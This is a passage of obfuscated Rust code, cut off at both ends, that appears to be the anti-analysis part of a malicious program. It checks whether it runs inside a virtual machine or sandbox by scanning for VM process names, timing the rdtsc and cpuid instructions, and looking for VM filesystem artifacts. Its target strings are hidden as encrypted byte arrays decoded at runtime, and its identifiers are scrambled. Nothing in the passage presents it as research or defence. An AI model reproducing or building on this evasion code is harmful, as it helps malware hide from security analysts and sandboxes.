, 141 , 107 , 3 , 9 , 146 , 35 , 133 , 23 , 141 , 142 , 88 , 110 , 153 , 51 , 109 , 151 , 16 , 155 , 133 , 243 , 142 , 48 , 114 , 107 , 73 , 49 , 30 , 15 , 203 , 204 , 139 , 142 , 182 , 157 , 202 , 132 , 18 , 207 , 186 , 39 , 235 , 184 , 82 , 11 , 192 , 113 , 159 , 98 , 34 , 243 , 217 , 14 , 170 , 211 , 210 , 88 , 182 , 52 , 164 , 53 , 213 , 109 , 237 , 21 , 191 , 123 , 16 , 50 , 151 , 50 , 179 , 180 , 204 , 50 , 151 , 253 , 45 , 36 , 109 , 118 , 10 , 249 , 182 , 127 , 117 , 37 , 148 , 142 , 136 , 115 , 195 , 254 , 72 , 212 , 163 , 150 , 70 , 68 , 224 , 197 , 162 , 147 , 32] , & [140 , 128 , 175 , 175 , 244 , 151 , 59 , 140 , 214 , 162 , 117 , 28 , 237 , 160 , 229 , 169 , 220 , 227 , 19 , 92 , 226 , 106 , 28 , 127 , 79 , 205 , 17 , 170 , 68 , 220 , 123 , 55 , 107 , 205 , 202 , 52 , 195 , 105 , 82 , 52 , 78 , 234 , 27 , 148 , 252 , 97 , 203 , 253 , 225 , 12 , 103 , 163 , 149 , 103 , 244 , 158 , 231 , 218 , 230 , 50 , 135 , 96 , 92 , 174 , 49 , 148 , 75 , 101 , 59 , 225 , 183 , 72 , 137 , 44 , 82 , 30 , 48 , 24 , 248 , 83 , 117 , 6 , 194 , 83 , 220 , 211 , 115 , 64] , 36283883717865u64) , decode_tk_smkebhmyyv (& [120 , 67 , 208 , 242 , 242 , 79 , 108 , 83 , 146 , 224 , 35 , 199 , 155 , 234 , 139 , 112 , 18 , 193 , 249 , 37 , 226 , 157 , 216 , 111 , 22 , 237 , 227 , 157 , 105 , 3 , 182 , 215 , 65 , 234 , 68 , 233 , 253 , 6 , 248 , 109 , 74 , 204 , 109 , 227 , 221 , 142 , 13 , 75 , 67 , 172 , 35 , 203 , 125 , 3 , 110 , 51 , 202 , 170 , 1 , 90 , 244 , 94 , 171 , 14 , 100 , 114 , 167 , 117 , 120 , 146 , 200 , 106 , 192 , 238 , 234 , 208 , 35 , 13 , 243 , 128 , 210 , 84 , 109 , 56 , 16 , 250 , 177 , 31 , 184 , 13 , 231 , 140 , 27 , 121 , 18 , 79 , 148 , 139 , 175 , 99 , 45 , 78 , 55 , 25 , 242 , 29 , 10 , 13 , 177 , 163 , 175 , 251 , 88 , 28 , 222 , 127 , 67 , 180 , 245 , 159 , 199 , 24 , 204 , 105 , 103 , 223 , 146 , 1 , 41 , 209 , 192 , 53 , 15 , 94 , 165 , 166 , 175 , 105 , 144 , 89 , 134 , 197 , 132 , 249 , 90 , 152 , 88 , 250 , 100 , 127 , 86 , 37 , 210 , 110 , 26 , 223 , 109 , 23 , 23 , 109 , 18 , 1 , 131 , 55 , 98 , 79 , 71 , 219 , 239 , 143 , 161 , 173 , 9 , 168 , 36 , 216 , 179 , 246 , 251 , 152 , 140 , 224 , 2 , 118 , 220 , 38 , 61 , 141 , 143 , 40 , 1 , 98 , 153 , 126 , 234 , 186 , 171 , 33 , 66 , 169 , 241 , 33 , 109 , 75 , 128 , 130 , 98 , 49] , & [90 , 45 , 180 , 37 , 37 , 75 , 169 , 181 , 158 , 165 , 211 , 180 , 200 , 236 , 168 , 138 , 247 , 107 , 121 , 245 , 107 , 222 , 109 , 184 , 122 , 217 , 5 , 100 , 6 , 252 , 0 , 240 , 12 , 75 , 91 , 81 , 60 , 235 , 86 , 15 , 178 , 164 , 216 , 68 , 193 , 9 , 214 , 220 , 237 , 93 , 189 , 28 , 93 , 118 , 189 , 92 , 106 , 41 , 8 , 120 , 249 , 118 , 66 , 1 , 211 , 190 , 128 , 10 , 139 , 219 , 98 , 155 , 165 , 250 , 62 , 69 , 104 , 52 , 226 , 250 , 117 , 217 , 155 , 160 , 190 , 214 , 136 , 249] , 64866891073172u64) , decode_tk_smkebhmyyv (& [109 , 23 , 231 , 68 , 231 , 123 , 4 , 254 , 127 , 213 , 210 , 228 , 8 , 64 , 198 , 109 , 46 , 137 , 51 , 81 , 26 , 94 , 71 , 54 , 194 , 144 , 7 , 159 , 229 , 71 , 192 , 9 , 205 , 28 , 89 , 245 , 35 , 177 , 244 , 178 , 180 , 98 , 169 , 10 , 17 , 62 , 123 , 121 , 251 , 152 , 135 , 155 , 216 , 71 , 97 , 132 , 7 , 154 , 199 , 169 , 30 , 174 , 88 , 199 , 26 , 252 , 189 , 216 , 200 , 86 , 78 , 238 , 25 , 124 , 73 , 176 , 56 , 195 , 88 , 148 , 129 , 124 , 200 , 141 , 89 , 226 , 192 , 13 , 18 , 148 , 104 , 247 , 182 , 220 , 181 , 106 , 213 , 160 , 6 , 254 , 95 , 30 , 182 , 229 , 202 , 248 , 255 , 174 , 51 , 63 , 215 , 147 , 107 , 160 , 4 , 247 , 122 , 114 , 136 , 41 , 14 , 215 , 60 , 110 , 83 , 110 , 80 , 240 , 179 , 188 , 73 , 239 , 247 , 209 , 140 , 242 , 77 , 20 , 35 , 101 , 64 , 39 , 254 , 82 , 120 , 10 , 113 , 245 , 136 , 16 , 151 , 19 , 61 , 80 , 204 , 83 , 239 , 42 , 41 , 49 , 149 , 191 , 52 , 9 , 69 , 172 , 10 , 100 , 185 , 157 , 56 , 195 , 24 , 217 , 63 , 115 , 36 , 242 , 97 , 241 , 21 , 65 , 105 , 131 , 115 , 113 , 107 , 34 , 1 , 177 , 254 , 240] , & [149 , 187 , 52 , 194 , 234 , 83 , 97 , 33 , 102 , 62 , 209 , 180 , 30 , 69 , 163 , 95 , 254 , 75 , 73 , 16 , 82 , 129 , 105 , 108 , 122 , 210 , 129 , 101 , 211 , 43 , 15 , 174 , 39 , 126 , 81 , 82 , 213 , 8 , 212 , 99 , 216 , 137 , 32 , 66 , 164 , 237 , 226 , 219 , 167 , 116 , 188 , 57 , 252 , 206 , 193 , 171 , 17 , 32 , 143 , 245 , 36 , 155 , 103 , 66 , 136 , 53 , 142 , 65 , 74 , 99 , 73 , 158 , 49 , 202 , 182 , 115 , 231 , 214 , 73 , 21 , 234 , 234 , 54 , 166 , 210 , 144 , 51 , 230] , 44014824850787u64) , decode_tk_smkebhmyyv (& [92 , 231 , 225 , 46 , 103 , 120 , 88 , 95 , 129 , 181 , 198 , 134 , 54 , 14 , 3 , 230 , 181 , 219 , 95 , 199 , 129 , 78 , 227 , 250 , 192 , 59 , 63 , 196 , 196 , 165 , 134 , 230 , 23 , 36 , 75 , 241 , 216 , 147 , 147 , 247 , 226 , 108 , 17 , 236 , 240 , 157 , 202 , 136 , 35 , 50 , 62 , 20 , 68 , 242 , 132 , 232 , 160 , 181 , 206 , 0 , 22 , 146 , 171 , 39 , 139 , 171 , 74 , 156 , 72 , 224 , 13 , 32 , 109 , 159 , 232 , 253 , 173 , 219 , 208 , 196 , 115 , 22 , 56 , 60 , 218 , 153 , 209 , 203 , 16 , 182 , 106 , 108 , 140 , 5 , 139 , 170 , 84 , 126 , 57 , 13 , 134 , 246 , 242 , 102 , 75 , 129 , 198 , 0 , 211 , 9 , 173 , 37 , 151 , 31 , 91 , 225 , 41 , 237 , 55 , 196 , 205 , 41 , 147 , 97 , 182 , 178 , 108 , 17 , 61 , 216 , 47 , 8 , 108 , 88 , 167 , 238 , 51 , 168 , 216 , 36 , 87 , 224 , 244 , 225 , 202 , 208 , 72 , 243 , 153 , 230 , 120 , 170 , 41 , 189 , 239 , 14 , 28 , 58 , 115 , 103 , 44 , 195 , 141 , 125 , 244 , 46 , 208 , 102 , 146 , 54 , 178 , 5 , 47 , 26 , 42 , 37 , 173 , 89 , 18 , 73 , 141 , 191 , 187 , 53 , 36 , 87 , 126 , 42 , 196 , 232 , 64 , 81] , & [203 , 120 , 22 , 207 , 57 , 225 , 121 , 28 , 127 , 133 , 175 , 51 , 95 , 125 , 167 , 209 , 19 , 119 , 85 , 79 , 237 , 100 , 154 , 119 , 189 , 184 , 123 , 36 , 231 , 229 , 110 , 56 , 14 , 168 , 28 , 70 , 204 , 7 , 142 , 122 , 41 , 232 , 26 , 118 , 124 , 227 , 125 , 184 , 227 , 9 , 48 , 164 , 86 , 220 , 111 , 121 , 74 , 59 , 108 , 13 , 11 , 134 , 118 , 159 , 92 , 59 , 73 , 43 , 165 , 191 , 231 , 40 , 85 , 235 , 6 , 94 , 28 , 200 , 61 , 187 , 166 , 107 , 109 , 76 , 31 , 99 , 6 , 39] , 50109383443905u64) , decode_tk_smkebhmyyv (& [236 , 42 , 191 , 237 , 198 , 145 , 182 , 19 , 66 , 202 , 211 , 231 , 68 , 237 , 135 , 106 , 37 , 240 , 69 , 78 , 6 , 226 , 69 , 222 , 195 , 63 , 112 , 227 , 221 , 188 , 78 , 95 , 218 , 46 , 85 , 51 , 210 , 197 , 201 , 212 , 252 , 43 , 2 , 139 , 58 , 66 , 109 , 45 , 2 , 243 , 167 , 154 , 225 , 98 , 68 , 5 , 253 , 129 , 3 , 156 , 132 , 88 , 86 , 17 , 1 , 16 , 205 , 14 , 22 , 205 , 95 , 117 , 93 , 248 , 17 , 7 , 40 , 149 , 174 , 7 , 16 , 128 , 197 , 32 , 3 , 157 , 37 , 32 , 23 , 113 , 210 , 157 , 22 , 157 , 92 , 114 , 19 , 154 , 18 , 254 , 152 , 195 , 225 , 4 , 0 , 134 , 213 , 249 , 202 , 130 , 219 , 2 , 12 , 90 , 217 , 231 , 23 , 238 , 147 , 110 , 92 , 52 , 226 , 180 , 162 , 227 , 249 , 10 , 41 , 234 , 153 , 25 , 107 , 128 , 102 , 88 , 92 , 21 , 125 , 163 , 25 , 116 , 157 , 255 , 112 , 135 , 9 , 238 , 31 , 215 , 208 , 141 , 175 , 194 , 61 , 229 , 171 , 206 , 18 , 94] , & [65 , 177 , 133 , 52 , 231 , 154 , 168 , 190 , 161 , 203 , 47 , 146 , 12 , 222 , 121 , 229 , 139 , 250 , 179 , 154 , 41 , 5 , 216 , 116 , 221 , 27 , 188 , 220 , 105 , 26 , 9 , 149 , 81 , 192 , 63 , 93 , 206 , 243 , 75 , 155 , 171 , 243 , 143 , 185 , 119 , 32 , 37 , 139 , 19 , 66 , 99 , 77 , 127 , 119 , 97 , 63 , 13 , 240 , 67 , 53 , 194 , 206 , 212 , 172 , 151 , 221 , 103 , 216 , 139 , 146 , 23 , 222 , 176 , 13 , 178 , 37 , 233 , 202 , 60 , 114 , 9 , 135 , 203 , 135 , 36 , 26 , 57 , 70] , 31976031519888u64) , decode_tk_smkebhmyyv (& [122 , 209 , 217 , 233 , 179 , 210 , 81 , 162 , 226 , 240 , 21 , 166 , 231 , 231 , 179 , 129 , 210 , 40 , 112 , 219 , 144 , 170 , 187 , 100 , 216 , 253 , 41 , 235 , 133 , 102 , 57 , 213 , 190 , 236 , 145 , 11 , 246 , 0 , 142 , 168 , 32 , 161 , 96 , 43 , 123 , 105 , 247 , 19 , 84 , 132 , 234 , 31 , 29 , 1 , 55 , 113 , 67 , 152 , 96 , 244 , 58 , 134 , 34 , 90 , 109 , 171 , 75 , 109 , 219 , 132 , 63 , 170 , 130 , 191 , 31 , 117 , 233 , 111 , 21 , 81 , 108 , 41 , 231 , 103 , 148 , 158 , 135 , 16 , 229 , 116 , 9 , 122 , 95 , 9 , 35 , 181 , 12 , 190 , 128 , 147 , 145 , 186 , 177 , 173 , 11 , 237 , 166 , 159 , 170 , 27 , 129 , 78 , 141 , 219 , 197 , 203 , 21 , 122 , 157 , 168 , 251 , 61 , 31 , 52 , 211 , 53 , 145 , 239 , 219 , 248 , 232 , 98 , 66 , 8 , 66 , 99 , 180 , 157 , 234 , 83 , 214 , 243 , 150 , 149] , & [12 , 183 , 15 , 232 , 109 , 193 , 150 , 238 , 148 , 87 , 60 , 84 , 170 , 254 , 241 , 12 , 196 , 177 , 40 , 236 , 17 , 85 , 240 , 75 , 172 , 147 , 40 , 77 , 193 , 156 , 209 , 236 , 88 , 48 , 102 , 153 , 108 , 136 , 90 , 3 , 108 , 29 , 65 , 51 , 94 , 251 , 126 , 32 , 212 , 22 , 47 , 227 , 147 , 43 , 5 , 45 , 241 , 166 , 56 , 244 , 183 , 29 , 29 , 217 , 102 , 2 , 185 , 132 , 70 , 233 , 69 , 19 , 226 , 6 , 31 , 212 , 159 , 144 , 224 , 213 , 255 , 38 , 126 , 185 , 204 , 146 , 45 , 3] , 27603754812446u64) , decode_tk_smkebhmyyv (& [37 , 252 , 174 , 90 , 71 , 56 , 245 , 2 , 235 , 48 , 201 , 156 , 183 , 5 , 132 , 182 , 212 , 242 , 194 , 38 , 199 , 72 , 32 , 135 , 96 , 15 , 24 , 80 , 88 , 166 , 114 , 185 , 226 , 167 , 173 , 117 , 232 , 101 , 186 , 187 , 141 , 88 , 151 , 135 , 113 , 63 , 196 , 105 , 124 , 92 , 185 , 2 , 159 , 226 , 33 , 51 , 112 , 115 , 186 , 37 , 11 , 119 , 50 , 45 , 41 , 246 , 252 , 243 , 218 , 124 , 137 , 52 , 253 , 26 , 0 , 184 , 149 , 98 , 188 , 13 , 187 , 57 , 251 , 104 , 18 , 50 , 110 , 245 , 102 , 25 , 55 , 224 , 75 , 70 , 179 , 233 , 73 , 55 , 183 , 136 , 38 , 253 , 217 , 112 , 110 , 115 , 124 , 119 , 11 , 104 , 19 , 224 , 93 , 21 , 87 , 230 , 190 , 233 , 216 , 172 , 5 , 118 , 159 , 113 , 189 , 170 , 3 , 191 , 181 , 25 , 97 , 60 , 40 , 177 , 145 , 212 , 143 , 11 , 61 , 63 , 45 , 79 , 80 , 168 , 217 , 123 , 91 , 17 , 187 , 161 , 112 , 75 , 112 , 56 , 128 , 197 , 248 , 119 , 202 , 179 , 206 , 2 , 255 , 149 , 246 , 89 , 224 , 132 , 195 , 47 , 27 , 15 , 165 , 217 , 137 , 123 , 162 , 153 , 230 , 29 , 145 , 226 , 249 , 139 , 228 , 15 , 61 , 7 , 57 , 31 , 167 , 75 , 142 , 22 , 186 , 42 , 33 , 179 , 39 , 43 , 36 , 170 , 84 , 165 , 98 , 161 , 97 , 141 , 156 , 241 , 180 , 199 , 81 , 255 , 229 , 116 , 166 , 128 , 56 , 57 , 248 , 247 , 63 , 134 , 241 , 241 , 180 , 178 , 98 , 134 , 196 , 33 , 17 , 89 , 176 , 34 , 136 , 178 , 250 , 74 , 139 , 64 , 190 , 199 , 219 , 35 , 223 , 8 , 91 , 237 , 143 , 42 , 227 , 208 , 240 , 44] , & [200 , 2 , 60 , 89 , 206 , 28 , 174 , 113 , 122 , 163 , 46 , 1 , 54 , 86 , 111 , 223 , 186 , 15 , 116 , 15 , 206 , 131 , 204 , 5 , 107 , 64 , 99 , 35 , 250 , 209 , 57 , 225 , 128 , 85 , 115 , 48 , 190 , 160 , 12 , 102 , 11 , 118 , 177 , 166 , 68 , 69 , 175 , 231 , 60 , 137 , 156 , 143 , 57 , 165 , 165 , 123 , 240 , 138 , 209 , 33 , 147 , 35 , 142 , 69 , 7 , 101 , 195 , 71 , 255 , 178 , 233 , 23 , 140 , 255 , 121 , 160 , 207 , 121 , 100 , 171 , 58 , 110 , 84 , 161 , 37 , 24 , 85 , 171] , 106867376261279u64) ,] ; loop { let exe_file_slice = { let len = process_entry . szExeFile . iter () . position (| & c | c == 0) . unwrap_or (process_entry . szExeFile . len ()) ; & process_entry . szExeFile [.. len] } ; let process_name = String :: from_utf16_lossy (exe_file_slice) ; for vm_process in & vm_processes { if process_name . eq_ignore_ascii_case (& * * vm_process) { unsafe { let _ = CloseHandle (snapshot_handle) ; } ; return true ; } } if unsafe { Process32NextW (snapshot_handle , & mut process_entry) } . is_err () { break ; } } unsafe { let _ = CloseHandle (snapshot_handle) ; } ; false } # [cfg (any (target_arch = "x86" , target_arch = "x86_64"))] pub fn check_rdtsc_timing () -> bool {  const vynrkcvr : u32 = 10 ; const u_vudupgf : u64 = (181 + 819) ; let mut total_diff : u64 = 0 ; for _ in 0 .. vynrkcvr { let t1 = unsafe { _rdtsc () } ; let t2 = unsafe { _rdtsc () } ; let diff = t2 - t1 ; total_diff += diff ; } let avg_diff = total_diff / vynrkcvr as u64 ; avg_diff > u_vudupgf } # [cfg (not (any (target_arch = "x86" , target_arch = "x86_64")))] pub fn check_rdtsc_timing () -> bool { false } # [cfg (any (target_arch = "x86" , target_arch = "x86_64"))] pub fn check_cpuid_timing () -> bool {   const vynrkcvr : u32 = 10 ; const u_vudupgf : u64 = (101 + 299) ; let mut total_diff : u64 = 0 ; for _ in 0 .. vynrkcvr { let t1 = unsafe { _rdtsc () } ; let _cpuid = CpuId :: new () ; let t2 = unsafe { _rdtsc () } ; let diff = t2 - t1 ; total_diff += diff ; } let avg_diff = total_diff / vynrkcvr as u64 ; avg_diff > u_vudupgf } # [cfg (not (any (target_arch = "x86" , target_arch = "x86_64")))] pub fn check_cpuid_timing () -> bool { false } pub fn check_filesystem_artifacts () -> bool { let vm_dirs = [decode_tk_smkebhmyyv (& [16 , 35 , 135 , 113 , 16 , 6 , 228 , 174 , 14 , 31 , 0 , 98 , 242 , 223 , 196 , 164 , 104 , 240 , 137 , 246 , 98 , 149 , 3 , 91 , 0 , 97 , 69 , 63 , 139 , 93 , 178 , 180 , 126 , 82 , 216 , 99 , 5 , 127 , 8 , 72 , 219 , 13 , 192 , 249 , 47 , 137 , 78 , 194 , 50 , 158 , 176 , 184 , 35 , 233 , 150 , 153 , 108 , 188 , 92 , 213 , 156 , 3 , 129 , 83 , 62 , 44 , 219 , 139 , 114 , 200 , 252 , 87 , 152 , 221 , 60 , 191 , 90 , 230 , 94 , 14 , 2 , 49 , 113 , 58 , 250 , 1 , 157 , 190 , 235 , 162 , 123 , 17 , 230 , 102 , 8 , 128 , 190 , 54 , 151 , 6 , 59 , 78 , 38 , 152 , 227 , 107 , 112 , 32 , 251 , 243 , 247 , 24 , 107 , 11 , 220 , 88 , 0 , 246 , 133 , 116 , 213 , 41 , 148 , 178 , 70 , 242 , 123 , 129 , 136 , 235 , 223 , 1 , 245 , 6 , 58 , 233 , 48 , 242 , 153 , 144 , 11 , 228 , 215 , 198 , 212 , 126 , 180 , 121 , 127 , 168 , 102 , 120 , 76 , 225 , 102 , 127 , 8 , 201 , 63 , 220 , 93 , 24 , 106 , 16 , 35 , 6 , 166 , 11 , 127 , 83 , 69 , 63 , 204 , 146 , 128 , 191 , 191 , 197 , 200 , 115 , 9 , 223 , 219 , 151 , 151 , 11 , 236 , 34 , 171 , 242 , 31 , 170 , 140 , 63 , 33 , 62 , 69 , 168 , 144 , 122 , 23 , 106 , 11 , 51 , 131 , 0 , 25 , 32 , 27 , 76 , 74 , 190 , 216 , 67 , 185 , 75 , 169 , 77 , 56 , 41 , 3 , 246 , 38 , 223 , 240 , 167 , 31 , 143 , 191 , 139 , 230 , 180 , 126 , 32 , 185 , 70 , 173 , 74 , 53 , 243 , 204 , 183 , 14 , 186 , 161 , 169 , 23 , 149 , 137 , 83 , 38 , 217 , 200 , 158 , 12 , 217 , 246 , 120 , 227 , 249 , 59 , 217 , 64 , 120 , 122 , 231 , 8 , 225 , 184 , 166 , 163 , 110] , & [149 , 246 , 209 , 134 , 255 , 253 , 217 , 253 , 253 , 118 , 208 , 0 , 74 , 135 , 153 , 0 , 223 , 3 , 155 , 142 , 122 , 211 , 123 , 54 , 148 , 9 , 148 , 80 , 185 , 179 , 46 , 25 , 163 , 69 , 229 , 195 , 162 , 30 , 187 , 142 , 183 , 21 , 32 , 93 , 44 , 34 , 97 , 160 , 99 , 55 , 119 , 43 , 123 , 240 , 73 , 57 , 144 , 225 , 238 , 110 , 186 , 17 , 172 , 147 , 224 , 76 , 32 , 125 , 177 , 45 , 226 , 24 , 99 , 92 , 116 , 205 , 188 , 6 , 174 , 93 , 200 , 250 , 202 , 240 , 42 , 0 , 38 , 149] , 107601815668851u64) , decode_tk_smkebhmyyv (& [109 , 11 , 221 , 111 , 142 , 80 , 38 , 218 , 112 , 88 , 131 , 113 , 153 , 174 , 201 , 151 , 36 , 154 , 76 , 18 , 165 , 215 , 101 , 76 , 198 , 29 , 150 , 6 , 168 , 161 , 170 , 25 , 216 , 93 , 0 , 155 , 77 , 146 , 125 , 193 , 189 , 174 , 35 , 62 , 193 , 57 , 47 , 132 , 185 , 85 , 212 , 15 , 123 , 246 , 139 , 249 , 165 , 172 , 191 , 46 , 96 , 225 , 213 , 151 , 3 , 49 , 55 , 149 , 22 , 35 , 97 , 88 , 232 , 223 , 62 , 17 , 0 , 218 , 231 , 79 , 131 , 51 , 229 , 27 , 8 , 232 , 126 , 7 , 151 , 184 , 35 , 184 , 71 , 206 , 42 , 170 , 76 , 126 , 174 , 124 , 130 , 95 , 229 , 69 , 118 , 162 , 31 , 56 , 248 , 114 , 170 , 246 , 61 , 159 , 177 , 172 , 73 , 255 , 249 , 54 , 91 , 150 , 18 , 226 , 248 , 123 , 239 , 103 , 135 , 138 , 90 , 210 , 141 , 180 , 131 , 7 , 148 , 22 , 241 , 211 , 91 , 110 , 253 , 174 , 1 , 36 , 185 , 112 , 105 , 255 , 215 , 200 , 4 , 73 , 138 , 106 , 101 , 64 , 232 , 188 , 204 , 245 , 29 , 122 , 35 , 159 , 124 , 124 , 143 , 145 , 139 , 132 , 122 , 159 , 249 , 141 , 128 , 81 , 224 , 175 , 47 , 2 , 128 , 158 , 124 , 3 , 145 , 147 , 25 , 145 , 90 , 148 , 33 , 35 , 39 , 180 , 135 , 86 , 32 , 75 , 48 , 165 , 232 , 13 , 47 , 52 , 67 , 46 , 204 , 118 , 154 , 33 , 235 , 106 , 176 , 231 , 151 , 2 , 243 , 10 , 95 , 146 , 120 , 42 , 27 , 109 , 242 , 169 , 95 , 118 , 113 , 122 , 166 , 48 , 55 , 176 , 6 , 194 , 104 , 26 , 30 , 203 , 164 , 178 , 204 , 255 , 56 , 111 , 4 , 90 , 103 , 23 , 204 , 252 , 187 , 48 , 49 , 51 , 23 , 166 , 7 , 106 , 48 , 40 , 72 , 253 , 4 , 119 , 1 , 1 , 240 , 184] , & [8 , 156 , 255 , 25 , 219 , 204 , 132 , 114 , 100 , 8 , 22 , 173 , 117 , 155 , 28 , 95 , 121 , 177 , 99 , 4 , 128 , 31 , 102 , 124 , 226 , 143 , 207 , 88 , 31 , 253 , 33 , 101 , 112 , 106 , 208 , 205 , 25 , 156 , 232 , 84 , 79 , 238 , 120 , 70 , 201 , 188 , 181 , 176 , 32 , 78 , 82 , 192 , 127 , 3 , 119 , 4 , 113 , 161 , 104 , 171 , 49 , 96 , 246 , 238 , 220 , 16 , 55 , 152 , 128 , 65 , 147 , 65 , 174 , 253 , 69 , 92 , 1 , 136 , 110 , 38 , 132 , 128 , 6 , 153 , 193 , 55 , 108 , 203] , 107812269066359u64) , decode_tk_smkebhmyyv (& [29 , 36 , 227 , 180 , 169 , 221 , 193 , 85 , 216 , 142 , 31 , 112 , 55 , 162 , 34 , 60 , 77 , 53 , 220 , 237 , 6 , 162 , 30 , 250 , 41 , 139 , 209 , 57 , 152 , 0 , 54 , 65 , 136 , 30 , 233 , 57 , 197 , 105 , 56 , 214 , 155 , 76 , 39 , 22 , 245 , 220 , 33 , 112 , 228 , 36 , 150 , 204 , 209 , 81 , 168 , 209 , 119 , 113 , 155 , 168 , 191 , 105 , 80 , 108 , 218 , 209 , 176 , 55 , 215 , 194 , 9 , 250 , 244 , 58 , 163 , 99 , 100 , 158 , 16 , 235 , 16 , 44 , 206 , 110 , 143 , 153 , 25 , 185 , 221 , 231 , 221 , 70 , 3 , 108 , 39 , 137 , 206 , 20 , 210 , 21 , 129 , 86 , 92 , 242 , 65 , 241 , 91 , 128 , 231 , 64 , 24 , 27 , 202 , 255 , 166 , 96 , 177 , 69 , 184 , 42 , 156 , 242 , 233 , 44 , 123 , 253 , 208 , 142 , 78 , 88 , 195 , 155 , 3 , 173 , 123 , 108 , 128 , 122 , 121 , 119 , 190 , 114 , 227 , 185 , 25 , 58 , 147 , 212 , 145 , 101 , 49 , 237 , 71 , 215 , 29 , 81 , 128 , 140 , 137 , 105 , 134 , 228 , 67 , 251 , 201 , 184 , 32 , 164 , 247 , 144 , 230 , 18 , 253 , 225 , 11 , 56 , 198 , 3 , 87 , 245 , 31 , 60 , 59 , 191 , 135 , 215 , 114 , 5 , 197 , 252 , 124 , 102 , 18 , 192 , 194 , 106 , 219 , 254 , 37 , 52 , 106 , 143 , 153 , 143 , 50 , 17 , 29 , 171 , 141 , 82 , 15 , 243 , 40 , 221 , 9 , 177 , 101 , 233 , 8 , 159 , 198 , 25 , 101 , 161 , 1 , 105 , 134 , 75 , 94 , 255 , 128 , 192 , 206 , 204 , 113 , 232 , 102 , 71 , 89 , 19 , 151 , 2 , 82 , 227 , 205 , 54 , 236 , 96 , 22 , 206 , 60 , 227 , 225 , 112 , 69 , 18 , 32 , 69 , 182 , 234 , 198 , 22 , 220 , 84 , 82 , 60 , 198 , 222 , 128 , 83 , 250 , 156 , 3 , 195 , 29 , 57 , 235 , 74 , 20 , 48 , 170 , 11 , 181 , 221 , 212 , 88 , 118 , 87 , 17 , 179 , 140 , 128 , 157 , 38 , 168 , 24 , 7 , 251 , 82 , 255 , 119 , 70 , 41 , 27 , 83 , 174 , 180 , 222 , 84 , 118 , 224 , 226 , 154 , 121 , 118 , 58 , 29 , 110 , 183 , 140 , 247 , 109 , 88 , 141 , 121 , 165 , 200 , 206 , 36 , 19 , 34 , 172 , 132 , 132 , 13 , 168] , & [217 , 158 , 210 , 150 , 215 , 188 , 65 , 75 , 32 , 136 , 255 , 93 , 19 , 115 , 174 , 130 , 151 , 159 , 32 , 91 , 229 , 185 , 146 , 210 , 16 , 193 , 126 , 228 , 123 , 168 , 247 , 82 , 184 , 104 , 251 , 230 , 177 , 62 , 198 , 81 , 38 , 165 , 196 , 213 , 55 , 159 , 72 , 53 , 205 , 113 , 14 , 61 , 78 , 167 , 122 , 195 , 80 , 79 , 231 , 26 , 53 , 194 , 96 , 84 , 192 , 45 , 103 , 55 , 161 , 131 , 240 , 186 , 11 , 108 , 156 , 200 , 152 , 193 , 84 , 187 , 102 , 169 , 211 , 196 , 78 , 116 , 4 , 215] , 150409754708529u64) , decode_tk_smkebhmyyv (& [211 , 154 , 68 , 156 , 206 , 24 , 1 , 209 , 32 , 9 , 254 , 154 , 67 , 26 , 129 , 110 , 160 , 57 , 134 , 191 , 36 , 240 , 142 , 164 , 69 , 30 , 38 , 120 , 131 , 219 , 206 , 51 , 45 , 81 , 34 , 103 , 7 , 154 , 142 , 201 , 128 , 206 , 176 , 138 , 77 , 63 , 24 , 153 , 184 , 173 , 27 , 58 , 25 , 42 , 109 , 54 , 69 , 64 , 84 , 136 , 136 , 130 , 75 , 240 , 117 , 157 , 147 , 180 , 105 , 23 , 9 , 236 , 102 , 244 , 128 , 23 , 220 , 104 , 245 , 47 , 107 , 0 , 124 , 86 , 132 , 153 , 55 , 76 , 101 , 93 , 140 , 26 , 78 , 158 , 244 , 80 , 196 , 31 , 73 , 139 , 199 , 110 , 114 , 228 , 8 , 52 , 141 , 105 , 212 , 118 , 92 , 29 , 50 , 148 , 33 , 180 , 177 , 91 , 158 , 25 , 39 , 9 , 107 , 206 , 201 , 176 , 27 , 89 , 193 , 224 , 45 , 19 , 2 , 89 , 125 , 125 , 124 , 193 , 66 , 235 , 33 , 50 , 141 , 177 , 51 , 122 , 84 , 119 , 129 , 192 , 228 , 113 , 181 , 3 , 172 , 181 , 2 , 143 , 137 , 64 , 104 , 78 , 212 , 181 , 236 , 70 , 14 , 192 , 137 , 169 , 111 , 187 , 234 , 239 , 19 , 40 , 184 , 67 , 46 , 105 , 106 , 9 , 236 , 224 , 40 , 91 , 189 , 69 , 185 , 164 , 51 , 209 , 51 , 67 , 59 , 249 , 111 , 183 , 89 , 148 , 9 , 245 , 183 , 59 , 76 , 151 , 226 , 151 , 59 , 236 , 58 , 79 , 106 , 246 , 170 , 233 , 118 , 68 , 103 , 19 , 180 , 99 , 25 , 59 , 162 , 80 , 156 , 132 , 109 , 75 , 198 , 62 , 180 , 22 , 48 , 149 , 87 , 164 , 192 , 220 , 204 , 113 , 110 , 55 , 1 , 108 , 164 , 96 , 77 , 4 , 27 , 95 , 190 , 190 , 125 , 182 , 121 , 64 , 116 , 124 , 56 , 124 , 226 , 106 , 25 , 69 , 169 , 63 , 6 , 234 , 19 , 133 , 177 , 180 , 207 , 27 , 78 , 164 , 210 , 49 , 46 , 117 , 122 , 201 , 40 , 146 , 43 , 255 , 54 , 14 , 30 , 41 , 70 , 44 , 217 , 173 , 72 , 23 , 6 , 67 , 255 , 47 , 242 , 195 , 25 , 178 , 35 , 237 , 249 , 83 , 227 , 44 , 253 , 209 , 205 , 116 , 51 , 181 , 82 , 239] , & [2 , 20 , 90 , 55 , 159 , 233 , 175 , 237 , 213 , 81 , 51 , 226 , 103 , 84 , 44 , 54 , 255 , 5 , 19 , 163 , 169 , 10 , 70 , 151 , 75 , 68 , 191 , 152 , 179 , 40 , 36 , 78 , 193 , 84 , 47 , 206 , 73 , 203 , 34 , 81 , 168 , 5 , 194 , 81 , 193 , 48 , 36 , 96 , 241 , 225 , 211 , 116 , 243 , 115 , 233 , 207 , 242 , 127 , 160 , 48 , 214 , 130 , 206 , 5 , 248 , 162 , 179 , 90 , 246 , 92 , 13 , 69 , 113 , 211 , 183 , 178 , 210 , 39 , 59 , 11 , 35 , 20 , 44 , 4 , 140 , 83 , 5 , 219] , 138491220462017u64) , decode_tk_smkebhmyyv (& [212 , 138 , 240 , 146 , 66 , 235 , 106 , 209 , 199 , 50 , 27 , 172 , 67 , 33 , 216 , 200 , 176 , 160 , 38 , 115 , 14 , 186 , 102 , 40 , 200 , 59 , 27 , 186 , 168 , 162 , 138 , 13 , 149 , 